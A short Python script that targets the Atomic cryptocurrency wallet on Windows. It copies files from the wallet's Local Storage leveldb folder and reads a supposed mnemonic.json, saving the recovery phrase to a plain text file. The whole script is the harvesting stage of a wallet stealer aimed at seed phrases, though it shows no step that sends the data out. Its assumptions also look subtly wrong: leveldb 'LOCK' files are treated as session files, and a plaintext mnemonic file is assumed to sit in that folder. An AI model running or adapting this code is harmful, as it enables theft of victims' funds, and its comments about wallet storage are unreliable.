import os
import shutil
import json

# Set the folder path to save session files and mnemonic phrase
folder_path = "."

# Get the wallet path
wallet_path = os.path.join(os.getenv("LOCALAPPDATA"), "atomic", "Local Storage", "leveldb")

# Copy the session files to the folder path
session_files = [file for file in os.listdir(wallet_path) if file.startswith("LOCK")]
for session_file in session_files:
    shutil.copy(os.path.join(wallet_path, session_file), os.path.join(folder_path, session_file))

# Get the mnemonic phrase
mnemonic_path = os.path.join(wallet_path, "mnemonic.json")
with open(mnemonic_path, "r") as f:
    mnemonic_json = json.load(f)
mnemonic_phrase = mnemonic_json["mnemonic"]

# Save the mnemonic phrase to a txt file in the folder path
with open(os.path.join(folder_path, "mnemonic.txt"), "w") as f:
    f.write(mnemonic_phrase)
